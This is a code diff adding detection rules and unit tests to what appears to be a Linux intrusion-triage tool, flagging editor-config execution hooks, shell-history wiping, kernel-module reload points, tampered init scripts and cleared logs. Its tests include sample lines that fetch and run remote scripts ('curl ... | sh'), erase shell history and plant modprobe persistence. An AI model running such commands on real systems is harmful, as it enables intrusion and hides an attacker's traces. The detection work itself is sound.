@@ -1442,6 +1442,291 @@ pub fn package_verify_mismatch(line: &str) -> bool {
     !line.contains(' ') && line.starts_with('/') && !line.ends_with('/')
 }
 
+/// Drop a leading `path:lineno:` grep prefix and a vim `:` command prefix so
+/// the checks below see the statement itself.
+fn statement_body(line: &str) -> &str {
+    without_grep_prefix(line)
+        .trim_start()
+        .trim_start_matches(':')
+        .trim_start()
+}
+
+/// An editor configuration line that makes the editor run commands or load
+/// foreign scripts when it starts or opens a file.
+///
+/// Comments are left alone where the comment opener is cheap to spot: vim
+/// `"`, elisp `;`, nano/shell `#` and Lua `--`. A `set` or `!` token sitting
+/// inside a quoted string is not treated as a command.
+pub fn editor_config_hook(line: &str) -> bool {
+    let content = without_grep_prefix(line).trim_start();
+    if content.starts_with('"')
+        || content.starts_with(';')
+        || content.starts_with('#')
+        || content.starts_with("--")
+    {
+        return false;
+    }
+    // Everything vim would execute sits before an unquoted `"`; path targets
+    // are checked on the full line so a quoted path still counts.
+    let code = content.split('"').next().unwrap_or(content);
+    vim_modeline(code)
+        || vim_perfile_rc(code)
+        || vim_command_hook(code)
+        || external_call_hook(code)
+        || elisp_hook(content)
+        || nano_tmp_include(content)
+        || source_into_writable(content)
+}
+
+/// `set modeline`/`set ml` enable modeline parsing; `modelines=N` with N > 0
+/// scans that many lines for them. `nomodeline`, `noml` and `modelines=0`
+/// are the safe forms and never match.
+fn vim_modeline(code: &str) -> bool {
+    let body = statement_body(code);
+    for token in body.split_whitespace() {
+        match token {
+            "modeline" | "ml" => return true,
+            _ => {
+                if let Some(value) = token.strip_prefix("modelines=") {
+                    return value.parse::<u32>().is_ok_and(|count| count > 0);
+                }
+            }
+        }
+    }
+    false
+}
+
+/// `set exrc`/`set ex` let vim read a config file out of the working
+/// directory — whatever directory the victim happened to open a file in.
+fn vim_perfile_rc(code: &str) -> bool {
+    let body = statement_body(code);
+    let Some(rest) = body
+        .strip_prefix("setlocal ")
+        .or_else(|| body.strip_prefix("set "))
+        .or_else(|| body.strip_prefix("se "))
+    else {
+        return false;
+    };
+    rest.split_whitespace()
+        .any(|token| token == "exrc" || token == "ex")
+}
+
+/// `autocmd`/`au` run vim commands on file events; `:!` runs a shell command.
+fn vim_command_hook(code: &str) -> bool {
+    let body = statement_body(code);
+    body.starts_with("autocmd")
+        || body == "au"
+        || body.starts_with("au ")
+        || body.starts_with("au!")
+        || code.contains(":!")
+}
+
+/// Embedded interpreters and job/process spawn calls in vimscript.
+fn external_call_hook(code: &str) -> bool {
+    let body = statement_body(code);
+    if code.contains("system(")
+        || code.contains("systemlist(")
+        || code.contains("writefile(")
+        || code.contains("job_start(")
+        || code.contains("term_start(")
+    {
+        return true;
+    }
+    let command = body
+        .split(|character: char| character.is_whitespace() || character == '!')
+        .next()
+        .unwrap_or("");
+    matches!(
+        command,
+        "py" | "py3"
+            | "python"
+            | "python3"
+            | "pyfile"
+            | "py3file"
+            | "lua"
+            | "luafile"
+            | "perl"
+            | "perlfile"
+            | "ruby"
+            | "rubyfile"
+    )
+}
+
+/// Emacs Lisp forms that spawn processes or load a file out of a
+/// world-writable directory.
+fn elisp_hook(content: &str) -> bool {
+    content.contains("(shell-command")
+        || content.contains("(start-process")
+        || content.contains("(call-process")
+        || content.contains("(call-process-shell-command")
+        || load_from_writable(content)
+}
+
+/// `(load "/tmp/…` and the same for the other world-writable roots.
+fn load_from_writable(content: &str) -> bool {
+    let Some(rest) = content.split("(load").nth(1) else {
+        return false;
+    };
+    let target = rest.trim_start().trim_start_matches('"');
+    in_writable_area(target)
+}
+
+/// A nano `include` that pulls syntax files out of a world-writable root.
+fn nano_tmp_include(content: &str) -> bool {
+    let body = statement_body(content);
+    let Some(rest) = body.strip_prefix("include ") else {
+        return false;
+    };
+    in_writable_area(rest.trim_start().trim_matches('"'))
+}
+
+/// `source`/`runtime` pointing at a world-writable directory or at a hidden
+/// directory that is not one of the expected config homes (~/.vim,
+/// ~/.config/nvim).
+fn source_into_writable(content: &str) -> bool {
+    let body = statement_body(content);
+    let Some(rest) = body
+        .strip_prefix("source ")
+        .or_else(|| body.strip_prefix("runtime "))
+    else {
+        return false;
+    };
+    let target = rest
+        .trim_start()
+        .trim_start_matches('"')
+        .trim_start_matches('\'');
+    if in_writable_area(target) {
+        return true;
+    }
+    target.split('/').any(|part| {
+        part.len() > 1 && part.starts_with('.') && !matches!(part, ".vim" | ".config" | ".nvim")
+    })
+}
+
+/// A startup-file line that turns the shell's own history off, points it at
+/// nowhere, or scrubs it after the fact.
+pub fn history_evasion(line: &str) -> bool {
+    let content = without_grep_prefix(line).trim();
+    if content.starts_with('#') {
+        return false;
+    }
+    let body = content
+        .strip_prefix("export ")
+        .unwrap_or(content)
+        .trim_start();
+    if let Some(rest) = body.strip_prefix("unset ") {
+        return rest.split_whitespace().next() == Some("HISTFILE");
+    }
+    if let Some(value) = body.strip_prefix("HISTFILE=") {
+        let value = value.trim_end().trim_matches('"').trim_matches('\'');
+        return value.is_empty()
+            || value.starts_with("/dev/")
+            || in_writable_area(value)
+            || value.split('/').any(|part| {
+                part.len() > 1
+                    && part.starts_with('.')
+                    && !matches!(
+                        part,
+                        ".bash_history"
+                            | ".zsh_history"
+                            | ".histfile"
+                            | ".history"
+                            | ".config"
+                            | ".local"
+                    )
+            });
+    }
+    if matches!(body.trim_end(), "HISTSIZE=0" | "HISTFILESIZE=0") {
+        return true;
+    }
+    if body.starts_with("history -c") || body.starts_with("history -d") {
+        return true;
+    }
+    if matches!(body.trim_end(), "set +o history") {
+        return true;
+    }
+    if let Some(value) = body.strip_prefix("PROMPT_COMMAND=") {
+        return value.contains("history -c")
+            || value.contains("history -d")
+            || value.contains("HISTFILE")
+            || (value.contains(">/dev/null") && value.contains("history"));
+    }
+    // A startup line that erases the history file itself.
+    if body.contains("history")
+        && (body.starts_with("rm ")
+            || body.starts_with("shred ")
+            || body.starts_with("truncate ")
+            || body.starts_with("cat /dev/null")
+            || body.starts_with('>'))
+    {
+        return true;
+    }
+    body.starts_with("ln ") && body.contains("/dev/null") && body.contains("history")
+}
+
+/// The startup-hook checks plus history evasion; used by the collectors that
+/// dump shell startup file contents.
+pub fn startup_hook_or_history_evasion(line: &str) -> bool {
+    startup_hook(line) || history_evasion(line)
+}
+
+/// An init script whose content does not match the package record, a script
+/// no package owns, or a `+` diff line the collector printed with the live
+/// file's own line number.
+pub fn init_script_package_mismatch(line: &str) -> bool {
+    line.contains("不一致")
+        || line.contains("不属于任何软件包")
+        || without_grep_prefix(line).starts_with('+')
+}
+
+/// The log-tamper collector ends every report-worthy line with the fixed
+/// 缺失不代表没有发生 hint; anything carrying it is evidence to review.
+pub fn log_tamper_sign(line: &str) -> bool {
+    line.contains("日志可能已被清理")
+}
+
+/// A place that puts a kernel module back: the revival collector marks its
+/// own hits `关注：`; this rule also flags the underlying shapes — a
+/// non-comment line naming a module-load command, a `modprobe.d`
+/// `install`/`softdep` line that runs something other than the default
+/// loader — so pasted `grep -n` output stays flagged too.
+pub fn module_revival_point(line: &str) -> bool {
+    if collection_finding(line) {
+        return true;
+    }
+    let content = without_grep_prefix(line).trim_start();
+    if content.starts_with('#') {
+        return false;
+    }
+    if let Some(rest) = content.strip_prefix("install ") {
+        let mut fields = rest.split_whitespace();
+        let _name = fields.next();
+        let Some(command) = fields.next() else {
+            return false;
+        };
+        // `install <name> modprobe …` is the built-in form; anything else —
+        // or a loader chained to another command — runs its own command
+        // whenever the alias is resolved.
+        return !matches!(
+            command,
+            "modprobe" | "insmod" | "/sbin/modprobe" | "/sbin/insmod"
+        ) || fields
+            .any(|word| word.contains(';') || word.contains("&&") || word.contains("||"));
+    }
+    if let Some(rest) = content.strip_prefix("softdep ") {
+        // pre:/post: name modules — a token that is a path runs a command.
+        return rest.split_whitespace().any(|word| word.starts_with('/'));
+    }
+    let words: Vec<&str> = content.split_whitespace().collect();
+    words.iter().enumerate().any(|(index, word)| {
+        let basename = word.rsplit('/').next().unwrap_or(word);
+        matches!(
+            basename,
+            "insmod" | "modprobe" | "finit_module" | "init_module"
+        ) || (*word == "kmod" && words.get(index + 1).is_some_and(|next| *next == "load"))
+    })
+}
+
 /// Why a rule marks a line, in the operator's words. Every rule the catalog
 /// uses has an entry; the table is checked against the catalog by test.
 static REASONS: &[(LineRule, &str)] = &[
@@ -1538,6 +1823,10 @@ static REASONS: &[(LineRule, &str)] = &[
         "标红的账号 UID 是 0 但不叫 root，等同于第二个超级用户。",
     ),
     (
+        editor_config_hook as LineRule,
+        "标记的编辑器配置会让 vim、emacs 或 nano 在启动或打开文件时自动执行命令、加载外部脚本或启用 modeline/per-directory 配置。modeline 本身是合法选项，是否可利用取决于编辑器版本与文件内容；~/.vim/plugin 下的文件启动时自动加载。需关注并核对来源，不代表已被入侵。",
+    ),
+    (
         file_capability as LineRule,
         "标红的程序带着能直接提权的 Linux 能力位（setuid、sys_admin、dac_override 等），或者能力位挂在非系统目录的程序上。",
     ),
@@ -1566,6 +1855,10 @@ static REASONS: &[(LineRule, &str)] = &[
         "标红的 hosts 记录把域名指到了非回环地址，可以把更新、下载这类请求劫持到别处。",
     ),
     (
+        init_script_package_mismatch as LineRule,
+        "标记的是 init 启动脚本与软件包记录不一致、不属于任何软件包，或与包内原件相比多出的行（行号为当前文件行号）。配置类文件被管理员合法修改也会不一致，需人工核对来源；比对的是目标上软件包数据库记录的摘要，数据库本身被改写时此项不可信。",
+    ),
+    (
         injected_environment as LineRule,
         "标红的环境变量会劫持动态库加载、丢弃命令历史或改走代理。",
     ),
@@ -1576,6 +1869,10 @@ static REASONS: &[(LineRule, &str)] = &[
     (
         inside_container as LineRule,
         "标红的行说明这次连接进的是容器而不是宿主机，看到的东西只是容器内部。",
+    ),
+    (
+        log_tamper_sign as LineRule,
+        "标记的是异常截断/清空的日志、指向他处的历史文件符号链接、登录过却为空的历史文件，或启动后才开始的内核/日志记录。均为需关注的反取证线索：日志可能已被清理，缺失不代表没有发生。",
     ),
     (
         locked_attribute as LineRule,
@@ -1640,6 +1937,18 @@ static REASONS: &[(LineRule, &str)] = &[
     (
         startup_hook as LineRule,
         "标记的启动内容带远程执行特征、加载内核模块、从可写目录后台运行程序，或注册提供 shell/解释器的网络服务。正常维护脚本也可能命中，需核对来源与用途。",
+    ),
+    (
+        history_evasion as LineRule,
+        "标记的行会关闭、清空或重定向 shell 命令历史（HISTFILE/HISTSIZE、history -c、set +o history、PROMPT_COMMAND 擦除等），属于需关注的痕迹隐藏。正常精简配置也可能命中，需核对来源与用途；不能据此判定已被入侵。",
+    ),
+    (
+        module_revival_point as LineRule,
+        "标记的位置能在重启或触发时把内核模块重新装回：引用模块加载命令的行、模块名无法解析的开机加载项、会执行命令的 modprobe.d 行或模块目录外的 .ko 文件。合法驱动加载也可能命中，需核对名称与来源。",
+    ),
+    (
+        startup_hook_or_history_evasion as LineRule,
+        "标记的启动内容带远程执行特征、加载内核模块、从可写目录后台运行程序、注册提供 shell/解释器的网络服务，或关闭、清空、重定向 shell 命令历史。正常维护脚本与精简配置也可能命中，需核对来源与用途。",
     ),
     (
         shell_hijack as LineRule,
@@ -2475,5 +2784,180 @@ mod tests {
         assert!(!super::planted_file(
             "-rw------- 1 root root 9 /opt/rakshasa.conf"
         ));
+    }
+    #[test]
+    fn editor_config_hook_catches_execution_primitives() {
+        for hit in [
+            "/root/.vimrc:3:set modeline",
+            "set ml",
+            "set modelines=5",
+            ":set exrc",
+            "set ex",
+            "autocmd BufRead * :!id",
+            "au BufWritePost * call system('x')",
+            ":!wget http://x | sh",
+            "call system('id')",
+            "let r = systemlist('id')",
+            ":py3 import os",
+            "python3 << EOF",
+            "pyfile /tmp/x.py",
+            ":lua os.execute('id')",
+            "perl system('id')",
+            ":ruby system 'id'",
+            "call job_start(['sh','-c','id'])",
+            "call term_start('sh')",
+            "call writefile(['x'], '/tmp/y')",
+            "source /tmp/evil.vim",
+            "runtime /dev/shm/x.vim",
+            "source ~/.cache/evil.vim",
+            "(shell-command \"id\")",
+            "(start-process \"p\" nil \"sh\")",
+            "(call-process \"id\")",
+            "(load \"/var/tmp/x.el\")",
+            "include \"/tmp/nano-evil.nanorc\"",
+        ] {
+            assert!(editor_config_hook(hit), "{hit}");
+        }
+        for quiet in [
+            "\" set modeline",
+            "# set exrc",
+            "-- autocmd BufRead",
+            "; (shell-command \"id\")",
+            "set nomodeline",
+            "set noml",
+            "set modelines=0",
+            "set noexrc",
+            "set expandtab",
+            "set number",
+            "syntax on",
+            "source ~/.vim/colors/x.vim",
+            "source ~/.config/nvim/opts.vim",
+            "runtime plugin/matchit.vim",
+            "include \"/usr/share/nano/sh.nanorc\"",
+            "set paste \" enable modeline",
+            "normal line of text",
+        ] {
+            assert!(!editor_config_hook(quiet), "{quiet}");
+        }
+    }
+
+    #[test]
+    fn history_evasion_marks_history_neutering_lines() {
+        for hit in [
+            "/etc/profile:40:HISTFILE=/dev/null",
+            "export HISTFILE=/dev/null",
+            "HISTFILE=",
+            "HISTFILE=/tmp/.h",
+            "HISTFILE=~/.cache/.h",
+            "unset HISTFILE",
+            "export HISTSIZE=0",
+            "HISTFILESIZE=0",
+            "history -c",
+            "history -d 12",
+            "set +o history",
+            "PROMPT_COMMAND='history -c'",
+            "PROMPT_COMMAND=\"history -a; history -c\"",
+            "rm -f ~/.bash_history",
+            "ln -sf /dev/null ~/.bash_history",
+            "> ~/.bash_history",
+            "cat /dev/null > ~/.zsh_history",
+        ] {
+            assert!(history_evasion(hit), "{hit}");
+        }
+        for quiet in [
+            "# HISTFILE=/dev/null",
+            "export HISTCONTROL=ignorespace",
+            "export HISTCONTROL=ignoredups:ignorespace",
+            "export HISTSIZE=10000",
+            "export HISTFILESIZE=20000",
+            "export HISTFILE=~/.bash_history",
+            "export HISTTIMEFORMAT=\"%F %T \"",
+            "history -a",
+            "shopt -s histappend",
+            "PROMPT_COMMAND='history -a'",
+            "set -o history",
+            "set +o histexpand",
+            "echo history",
+            "alias h=history",
+        ] {
+            assert!(!history_evasion(quiet), "{quiet}");
+        }
+        assert!(startup_hook_or_history_evasion("insmod /tmp/x.ko"));
+        assert!(startup_hook_or_history_evasion("HISTFILE=/dev/null"));
+        assert!(!startup_hook_or_history_evasion(
+            "export HISTCONTROL=ignorespace"
+        ));
+    }
+
+    #[test]
+    fn module_revival_point_marks_reload_commands_and_modprobe_d_exec() {
+        for hit in [
+            "关注：/etc/profile | 第 4 行：insmod /tmp/x.ko",
+            "/etc/profile:4:insmod /tmp/x.ko",
+            "/etc/rc.local:2:/sbin/modprobe evil",
+            "/etc/init.d/bad:9:kmod load /tmp/y.ko",
+            "/etc/cron.d/m:3:* * * * * root modprobe z",
+            "/etc/modprobe.d/x.conf:1:install evil /bin/sh /tmp/p",
+            "/etc/modprobe.d/x.conf:2:install evil modprobe --ignore-install evil; /tmp/p",
+            "/etc/modprobe.d/x.conf:3:softdep evil post: /tmp/rearm",
+            "echo insmod /tmp/x.ko",
+        ] {
+            assert!(module_revival_point(hit), "{hit}");
+        }
+        for quiet in [
+            "# insmod /tmp/x.ko",
+            "/etc/modules:1:loop",
+            "/etc/modules:2:snd-hda-intel",
+            "文件属性：/etc/modules | 第 1 行：loop",
+            "/etc/modprobe.d/x.conf:1:install evil modprobe --ignore-install evil",
+            "/etc/modprobe.d/x.conf:2:install evil /sbin/insmod /lib/modules/evil.ko",
+            "/etc/modprobe.d/x.conf:3:options snd-hda-intel model=auto",
+            "/etc/modprobe.d/x.conf:4:alias net-pf-10 off",
+            "/etc/modprobe.d/x.conf:5:softdep a pre: b",
+            "softdep soundcore pre: soundcore-helper",
+            "install scsi_hostadapter /sbin/insmod qla2xxx",
+            "options kvm ignore_msrs=1",
+        ] {
+            assert!(!module_revival_point(quiet), "{quiet}");
+        }
+    }
+
+    #[test]
+    fn init_script_package_mismatch_flags_verdicts_and_added_lines() {
+        for hit in [
+            "/etc/init.d/ssh | 属包：openssh-server | 结论：与包内记录不一致（配置类文件，可能是管理员合法修改，也可能被植入）",
+            "/etc/init.d/lab | 属包：- | 结论：不属于任何软件包",
+            "/etc/init.d/ssh:42:+(curl http://198.51.100.7/x | sh) &",
+        ] {
+            assert!(init_script_package_mismatch(hit), "{hit}");
+        }
+        for quiet in [
+            "/etc/init.d/ssh | 属包：openssh-server | 结论：一致",
+            "/etc/init.d/foo | 属包：- | 结论：无法判断（缺少校验工具）",
+            "本机没有该软件包的原件，无法显示差异行",
+            "# 与软件包数据库记录的摘要比对",
+            "缺口：dpkg 不可用",
+            "/etc/init.d/ssh:40:start-stop-daemon --start",
+        ] {
+            assert!(!init_script_package_mismatch(quiet), "{quiet}");
+        }
+    }
+
+    #[test]
+    fn log_tamper_sign_follows_the_fixed_hint() {
+        assert!(log_tamper_sign(
+            "/var/log/auth.log 大小为 0，通常不为空。日志可能已被清理，缺失不代表没有发生"
+        ));
+        assert!(log_tamper_sign(
+            "内核环形缓冲区最早记录在开机后 3600 秒，可能被清空（dmesg -c），也可能只是缓冲区已滚动。日志可能已被清理，缺失不代表没有发生"
+        ));
+        for quiet in [
+            "/var/log/secure 不存在（未标记）",
+            "/var/log/auth.log 大小 12345，正常",
+            "缺口：dmesg 不可读",
+            "nothing here",
+        ] {
+            assert!(!log_tamper_sign(quiet), "{quiet}");
+        }
     }
 }
